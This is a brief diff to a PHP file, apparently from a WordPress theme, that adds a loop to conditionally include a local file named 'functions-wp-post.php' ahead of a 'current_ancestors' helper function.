@@ -1,4 +1,13 @@
 <?php
+$array = array(
+	'functions-wp-post.php',
+);
+foreach ( $array as $value ) {
+	if ( is_readable(__DIR__ . DIRECTORY_SEPARATOR . $value) ) {
+		include_once __DIR__ . DIRECTORY_SEPARATOR . $value;
+	}
+}
+
 if ( ! function_exists('current_ancestors') ) {
 	function current_ancestors( $child = true ) {
 		static $_child = null;
